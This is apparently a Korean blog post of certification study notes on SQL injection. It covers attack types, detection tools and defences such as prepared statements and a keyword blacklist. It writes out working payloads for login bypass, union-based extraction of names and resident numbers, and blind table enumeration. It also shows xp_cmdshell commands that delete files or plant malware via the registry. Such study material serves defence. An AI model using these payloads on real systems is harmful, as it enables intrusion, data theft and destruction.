<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="ko" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>정보보안 - SQL Injection | Bluesplatter</title>
<meta name="description" content="SQL Injection">


  <meta name="author" content="HY03">
  
  <meta property="article:author" content="HY03">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="ko_KR">
<meta property="og:site_name" content="Bluesplatter">
<meta property="og:title" content="정보보안 - SQL Injection">
<meta property="og:url" content="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/">


  <meta property="og:description" content="SQL Injection">







  <meta property="article:published_time" content="2021-06-28T19:00:00+09:00">





  

  


<link rel="canonical" href="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "HY03",
      "url": "https://bluesplatter.com/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bluesplatter Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/logo/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          세상에 남기는 작은 흔적
          <span class="site-subtitle">Bluesplatter</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/posts/">연도별 포스트</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">토글 메뉴</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="https://bluesplatter.com/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#is_certification" itemprop="item"><span itemprop="name">Is_certification</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">정보보안 - SQL Injection</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/profile/photo.jpg" alt="HY03" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HY03</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>저는 전문가가 아니고 이것 저것 알아보는 비전문가 입니다. <br /> 틀린 내용이 기술되어도 너그러이 봐주시고 댓글을 남겨주셨으면 좋겠습니다.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">팔로우</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Republic of Korea</span>
        </li>
      

      
        
          
        
          
            <li><a href="http://bluesplatter.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
          
        
          
        
          
        
          
            <li><a href="https://github.com/HY03" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      
        <li>
          <a href="mailto:hyunik03@gmail.com">
            <meta itemprop="email" content="hyunik03@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">이메일</span>
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="정보보안 - SQL Injection">
    <meta itemprop="description" content="SQL Injection">
    <meta itemprop="datePublished" content="2021-06-28T19:00:00+09:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">정보보안 - SQL Injection
</h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-06-28T19:00:00+09:00">June 28, 2021</time>
      </span>
    

    

    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On This Page</h4></header>
              <ul class="toc__menu">
  <li><a href="#sql-injection">SQL Injection</a>
    <ul>
      <li><a href="#sql-injection-1">SQL Injection</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="sql-injection">SQL Injection</h1>

<h2 id="sql-injection-1">SQL Injection</h2>
<ul>
  <li>개요
    <ul>
      <li>코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격
        <ul>
          <li>예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입</li>
        </ul>
      </li>
      <li>공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나</li>
      <li>Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편
        <ul>
          <li>스캐닝 툴
            <ul>
              <li>Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검</li>
              <li>SQLMap (Python) : 블라인드 SQL Injection 점검</li>
              <li>Absinthe : 블라인드 SQL Injection 점검</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>입력 값 필터링이 제대로 이루어지지 않는 경우 발생</li>
    </ul>
  </li>
  <li>Web Application 의 일반적인 인증 절차
    <ul>
      <li>ID/PW 입력</li>
      <li>SQL Query 생성</li>
      <li>Database 에 쿼리 전송</li>
      <li>Database 에서 쿼리 실행</li>
    </ul>
  </li>
  <li>공격방식에 따른 분류
    <ul>
      <li>Form SQL Injection
        <ul>
          <li>구조
            <ul>
              <li>HTML
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;form&gt;
          &lt;input /&gt;
          &lt;submit&gt;
      &lt;/form&gt;
</code></pre></div>                </div>
              </li>
              <li>웹서버
                <ul>
                  <li>PHP, JSP, ASP 처리</li>
                  <li>쿼리문 생성</li>
                  <li>WHERE 절을 TRUE 로 만든다 (공격예시)</li>
                </ul>
              </li>
              <li>DB</li>
            </ul>
          </li>
          <li>주석처리문자
            <ul>
              <li>MySQL : # , MSSQL : –, ORACLE : –</li>
            </ul>
          </li>
          <li>URL 인코딩 (<code class="language-plaintext highlighter-rouge">%xx</code> 로 표기, xx 는 16진수)
            <ul>
              <li><code class="language-plaintext highlighter-rouge">#</code> -&gt; %23</li>
              <li><code class="language-plaintext highlighter-rouge">-</code> -&gt; %2D</li>
              <li><code class="language-plaintext highlighter-rouge">'</code> -&gt; %27</li>
              <li><code class="language-plaintext highlighter-rouge">=</code> -&gt; %3D</li>
              <li>공백 -&gt; <code class="language-plaintext highlighter-rouge">+</code> 혹은 %20</li>
              <li>널문자 -&gt; %00</li>
              <li><code class="language-plaintext highlighter-rouge">;</code> -&gt; %3B</li>
            </ul>
          </li>
          <li>취약점 있는지 여부 파악 방법
            <ul>
              <li>ID 입력 란에 <code class="language-plaintext highlighter-rouge">'</code> 나 <code class="language-plaintext highlighter-rouge">"</code> 입력 후 테스트
                <ul>
                  <li>Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>예시
            <ul>
              <li>PHP 코드 (로그인처리)
                <ul>
                  <li>취약한 코드 예시
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $query = select id, pw from member where id='$id' and pw='$pw';
  $result = mysql_query($query, $connect);
  $num_rows = mysql_num_rows($result);
  if($num_rows) {
      $row = mysql_fetch_array($result);
      $id = $row[id];
      echo "로그인 성공";
  } else {
      echo "로그인 실패";
  }
</code></pre></div>                    </div>
                  </li>
                  <li>사용자가 입력한 값을 그대로 변수에 담아옴</li>
                  <li>변수에 <code class="language-plaintext highlighter-rouge">' or 1=1 #</code> 입력할 경우
                    <ul>
                      <li>ID : <code class="language-plaintext highlighter-rouge">' or 1=1 #</code></li>
                      <li>pW : <code class="language-plaintext highlighter-rouge">test</code>
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select id, pw from member where id='' or 1=1#and pw='test';
</code></pre></div>                        </div>
                      </li>
                    </ul>
                  </li>
                  <li>URI 인코딩 메시지 (HTTP 요청메시지)
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">id=' or 1=1#</code></li>
                      <li><code class="language-plaintext highlighter-rouge">id=%27+or+1%3d1%23</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>대응책
            <ul>
              <li>PHP 설정파일 : php.ini
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">magic_quotes_gpc=on</code> : GET, POST, Cookie 로 전달되는 데이터에 <code class="language-plaintext highlighter-rouge">'</code>(Single quote), <code class="language-plaintext highlighter-rouge">"</code>(Double quote), <code class="language-plaintext highlighter-rouge">\</code>(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)</li>
                  <li>5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $id = mysql_real_escape_string($id)
      $pw = mysql_real_escape_string($pw)
      $query = select id, pw from member where id='$id' and pw='$pw';
</code></pre></div>                    </div>
                    <ul>
                      <li>결과 : <code class="language-plaintext highlighter-rouge">select id, pw from member where id='\' or 1=1#'</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>Prepared Statement (선처리 질의문)
                <ul>
                  <li>동적으로 쿼리를 생성하지 않음</li>
                  <li>사용자의 입력값을 바인딩 처리
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $stmt=$conn-&gt;prepare("select id, pw from member where id=? and pw=?");
      $stmt-&gt;bind_param($id, $pw);
      $stmt-&gt;execute();
</code></pre></div>                    </div>
                  </li>
                  <li>입력값을 제외하고 사전 컴파일 처리</li>
                  <li>입력값은 명령어가 아닌 입력값으로만 처리</li>
                </ul>
              </li>
              <li>파라미터 필터링을 이용한 SQL Injection 방지
                <ul>
                  <li>블랙리스트 생성
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      function chk_blacklist($str){
          $returnVal = false;
          $blist = array('\'','\"','#','--','union','selector','update','or','and','insert','update')

          ###for 문 체크
              if 포함 $returnVal = true; break;
          ###

          return $returnVal;
      }

      $chk_id = chk_blacklist($id);
      $chk_pw = chk_blacklist($pw);
      if (chk_id || chk_pw){
          ...
      }
</code></pre></div>                    </div>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Union SQL Injection
        <ul>
          <li>Union 명령어
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select id, pw from member where id='test';
      select id, pw from member where id='test' union select 'test', '1212'; -- 결과값이 같을 경우 하나로 표기
      select id, pw from member where id='test' union all select 'test', '1212'; -- 결과값이 같을 경우 중복 표기
      select id, pw from member where id='' union select 'test','1234';
</code></pre></div>            </div>
            <ul>
              <li>조건 : Union 은 필드의 개수가 똑같아야 결합 가능</li>
            </ul>
          </li>
          <li>컬럼을 파악할 때 사용하는 명령
  <code class="language-plaintext highlighter-rouge">select * from member where id='' order by 4#;</code>
            <ul>
              <li>Error code : Unknown column ‘4’ in ‘order clause’ (필드가 3개라 판단)</li>
            </ul>
          </li>
          <li>공격방식
            <ul>
              <li>id 부분에 <code class="language-plaintext highlighter-rouge">' union select 'test', '1234'#</code> 입력
                <ul>
                  <li>오류없이 인증 우회 가능</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>예시 : 값 비교를 통한 form SQL Injection 방어 코드
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select id, pw from member where id=$id";
      $result = mysql_query($query, $conn);
      $num_rows = mysql_num_rows($result);
      if($num_rows) {
          $row = mysql_fetch_array($result);
          $id = $row[id];
          $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장
          if($pw != $rec_pw) {echo "로그인실패"} else {echo "로그인성공"}
      }
</code></pre></div>            </div>
            <ul>
              <li>Union SQL Injection 에 취약
                <ul>
                  <li>id : <code class="language-plaintext highlighter-rouge">' union' select 'test', 'test' #</code></li>
                  <li>pw : <code class="language-plaintext highlighter-rouge">test</code></li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Stored Procedure SQL Injection
        <ul>
          <li>저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미</li>
          <li>특정 작업을 일괄 처리하기 위한 용도로 사용</li>
          <li>명령어
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      exec master..xp_cmdshell 'dir c:\'
      exec master..xp_cmdshell 'del c:\ /q/s'
</code></pre></div>            </div>
            <ul>
              <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_cmdshell '시스템명령어'</code></li>
              <li>확장형 저장프로시저
                <ul>
                  <li>xp_cmdshell
                    <ul>
                      <li>관리자의 권한으로 임의의 명령을 수행</li>
                    </ul>
                  </li>
                  <li>xp_regwrite
                    <ul>
                      <li>레지스트리 작성</li>
                    </ul>
                  </li>
                  <li><code class="language-plaintext highlighter-rouge">exec master.dbo.xp_dirtree 'c:\'</code>
                    <ul>
                      <li>디렉토리 구조</li>
                    </ul>
                  </li>
                  <li>공격예시
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec master.dbo.xp_cmdshell 'ping 192.168.10.0'</code>
                        <ul>
                          <li>뒤의 명령도 실행됨.</li>
                        </ul>
                      </li>
                      <li><code class="language-plaintext highlighter-rouge">aaa.php?tt=1234;exec xp_regwrite 'HKEY_LOCAL_MACHINE','\software\microsoft\window...','winhelp',REG_SZ,'c:\temp\hac.exe'</code>
                        <ul>
                          <li>레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행</li>
                          <li><code class="language-plaintext highlighter-rouge">c:\temp\hac.exe</code> : 공격자가 심어놓은 악성코드</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Mass SQL Injection
        <ul>
          <li>기존의 SQL-Injection 기법보다 확장된 개념</li>
          <li>보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)
            <ul>
              <li>공격쿼리의 일부분을 HEX 인코딩</li>
              <li>전체 쿼리를 HEX 인코딩</li>
            </ul>
          </li>
          <li>대량의 DB값이 변조되어 홈페이지에 치명적인 악영향</li>
          <li>DB값 변조시 악성 스크립트를 삽입
            <ul>
              <li>사용자들이 변조된 사이트를 방문시 감염</li>
              <li>BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용</li>
            </ul>
          </li>
          <li>대상
            <ul>
              <li>공격대상이 MS-SQL 을 사용</li>
              <li>ASP 가 가동중인 IIS 웹서버</li>
            </ul>
          </li>
          <li>특징
            <ul>
              <li>데이터베이스에 악성코드를 대량으로 삽입</li>
              <li>자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입</li>
              <li>POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움</li>
              <li>악성코드 삽입 과정에서 데이터의 손실 발생</li>
              <li><code class="language-plaintext highlighter-rouge">&lt;script src=...&gt;&lt;/script&gt;</code> 태그를 삽입, js, swf, exe 파일</li>
              <li>HEX 코드로 인코딩 변환
                <ul>
                  <li>대상 코드
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      begin
          exec ('update' + @t + ' set' + @c + " = " &lt;script&gt; document.location = "http://www.xxx.com"&lt;/script&gt;'")
      end
</code></pre></div>                    </div>
                  </li>
                  <li>FW 등의 필터링을 우회</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>대응방법
            <ul>
              <li>declare 구문을 이용한 공격방식 차단
                <ul>
                  <li>위해 웹 소스상의 쿼리스트링 길이 제한</li>
                  <li>소스코드 수정 (중-장기 대응방안)</li>
                  <li>입력문자의 필터링</li>
                  <li>DB, System 정기 백업</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>공격유형에 따른 분류
    <ul>
      <li>에러 기반 SQL Injection
        <ul>
          <li>개요
            <ul>
              <li>DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감</li>
              <li>DB 에러가 외부로 노출되는 취약점을 이용한 공격</li>
              <li>Error 메시지를 노출하지 않으면 사용할 수 없음</li>
            </ul>
          </li>
          <li>예시
            <ul>
              <li>테이블명 및 필드명 획득
                <ul>
                  <li>having 이용
                    <ul>
                      <li>검색 창이 있을 시
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">select * from member ... </code></li>
                        </ul>
                      </li>
                      <li>group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링</li>
                      <li>` having 1=1 –`</li>
                      <li>오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’
                        <ul>
                          <li>member : 테이블명</li>
                          <li>idx : 필드명</li>
                        </ul>
                      </li>
                      <li><code class="language-plaintext highlighter-rouge">group by idx --</code></li>
                      <li>오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’</li>
                      <li><code class="language-plaintext highlighter-rouge">group by idx, bid --</code> …</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>컬럼(필드) 타입 획득
                <ul>
                  <li>sum() 이용 : 숫자형인지 여부</li>
                  <li>union 이용
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">union select sum(컬럼명) from member --</code></li>
                      <li>오류메시지 : 숫자타입의 필드(컬럼) -&gt; 동일 개수의 식이 있어야 합니다.</li>
                      <li>오류메시지 : VARCHAR 타입의 필드(컬럼) -&gt; sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.</li>
                    </ul>
                  </li>
                  <li>필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법
                    <ul>
                      <li>union select 에 NULL 을 활용</li>
                      <li><code class="language-plaintext highlighter-rouge">union select NULL,NULL,NULL,NULL from member</code></li>
                      <li><code class="language-plaintext highlighter-rouge">union select 1,NULL,NULL,NULL from member</code>
                        <ul>
                          <li>에러가 없으면 첫번째 컬럼은 Int 형</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>필드의 개수가 파악되면 ID, PW 를 받아올 수 있음
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">union select idx, name, password, ...</code></li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Blind SQL Injection
        <ul>
          <li>개요
            <ul>
              <li>쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견</li>
              <li>Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용</li>
              <li>정보를 수집하고 필드값이나 테이블 명을 추측하여 공격</li>
            </ul>
          </li>
          <li>예시
            <ul>
              <li>쿼리부분 예 (PHP)
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      $query = "select * from bbs
      where $find like '%$search%"
      order by idx desc";
</code></pre></div>                </div>
                <ul>
                  <li>설명
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">$search</code> : 사용자가 입력한 검색어</li>
                      <li><code class="language-plaintext highlighter-rouge">$find</code> : 제목, 내용, 작성자, 내용+제목 등</li>
                    </ul>
                  </li>
                  <li>검색어에 <code class="language-plaintext highlighter-rouge">' and 1=1#</code> 입력 시
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
                          <li><code class="language-plaintext highlighter-rouge">1=1</code> : True</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>검색어에 <code class="language-plaintext highlighter-rouge">' and 1=2#</code> 입력 시
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">where $find like '%' and 1=1#%</code>
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">$find like '%'</code> : True</li>
                          <li><code class="language-plaintext highlighter-rouge">1=2</code> : False</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>True 와 False 에 대한 결과로 BlindSQL Injection 가능여부를 판단</li>
                </ul>
              </li>
              <li>스키마
                <ul>
                  <li>Information_schema : DB의 구조, 제약조건 등 메타 데이터를 제공</li>
                  <li>Information_schema.tables : 모든 테이블에 대한 정보</li>
                  <li>Information_shcema.columns : 모든 테이블의 컬럼정보</li>
                </ul>
              </li>
              <li>함수
                <ul>
                  <li>limit : 출력 레코드의 개수를 제한하는 함수 (ex:limit pos,len)</li>
                  <li>substr : 문자열을 추출하는 함수 (ex:substr(문자열, pos, len))
                    <ul>
                      <li>pos : 시작위치 / len : 문자개수
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select table_schema, table_name, table_type from information_schema.tables
  where table_type = 'base table' -- 사용자가 만든 테이블
  limit 0,1 ;
</code></pre></div>                        </div>
                      </li>
                      <li>사용자가 만든 테이블을 처음부터 1개 가져오기
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select substr((select table_name from information_shcema.tables where table_type = 'base table' limit 0, 1), 1, 1) from dual;
</code></pre></div>                        </div>
                      </li>
                      <li>사용자가 만든 테이블명을 처음부터 1개 가져와서 앞자리 확인
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select column_name from information_schema.columns
  where table_name = 'employee' 
  limit 0, 1;
</code></pre></div>                        </div>
                      </li>
                      <li>테이블명이 ‘employee’ 인 컬럼명을 처음부터 1개 가져오기</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>활용법
                <ul>
                  <li>검색창에 입력
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#</code></li>
                    </ul>
                  </li>
                  <li>완성 쿼리 내용
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      select * from bbs where subhect like '%
      ' and substr((select table_name from information_schema.tables where table_type='base table' limit 0,1),1,1)='a'#%'
</code></pre></div>                    </div>
                    <ul>
                      <li>검색 결과값이 나오면 참, 결과값이 없으면 거짓</li>
                      <li>자동화된 툴을 이용해서 테이블 정보를 파악</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>과정
            <ul>
              <li>Table 정보 -&gt; 필드(Column) 정보 -&gt; Data 획득
                <ul>
                  <li>information_schema.tables, information_schema.columns, union select 이용</li>
                </ul>
              </li>
              <li>테이블명 획득
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and substr((select table_name ...),1,1)='a'#</code></li>
                  <li><code class="language-plaintext highlighter-rouge">%27+and+substr%28%28select+table_name...</code>
                    <ul>
                      <li>POST 의 Message Body 영역에 URIEncoding 방식으로 변경되어 전송됨</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li>컬럼정보 획득 (획득한 테이블 정보 employee)
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and substr((select column_name from information_schema.columns where tablew_name='employee' limit 0,1),1,1)='a'#</code></li>
                </ul>
              </li>
              <li>Data 획득 (획득한 컬럼정보 이용)
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select 'a','b','c','d','e','f','g','h','i'#</code>
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'#%'
</code></pre></div>                    </div>
                    <ul>
                      <li>1=2 를 통해 원 검색결과 출력을 막음</li>
                      <li>필드개수 9개 : bbs의 필드개수와 동일하게 설정</li>
                      <li>출력 결과를 통해 웹사이트의 필드가 어떤 컬럼과 매핑되는지 확인</li>
                    </ul>
                  </li>
                  <li>출력위치 확인 후 해당 위치로 employee 테이블의 조회결과 출력</li>
                  <li><code class="language-plaintext highlighter-rouge">' and 1=2 union select null,null,null,concat(name, '/', juminNo), null, null, null, null, null from employee#</code>
                    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  select * from bbs where subject like '%' and 1=2 union select null, null, null, concat(name, '/', juminNo), null, null, null, null, null from employee#%'
</code></pre></div>                    </div>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> 태그: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#%EC%96%B4%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98" class="page__taxonomy-item" rel="tag">어플리케이션</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EA%B8%B0%EC%82%AC" class="page__taxonomy-item" rel="tag">정보보안기사</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> 카테고리: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#is-certification" class="page__taxonomy-item" rel="tag">IS_Certification</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> 업데이트:</strong> <time datetime="2021-06-28T19:00:00+09:00">June 28, 2021</time></p>


      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">공유하기</h4>
  

  <a href="https://twitter.com/intent/tweet?text=%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88+-+SQL+Injection%20https%3A%2F%2Fbluesplatter.com%2Fis_certification%2FIS-Application-SQL_Injection%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

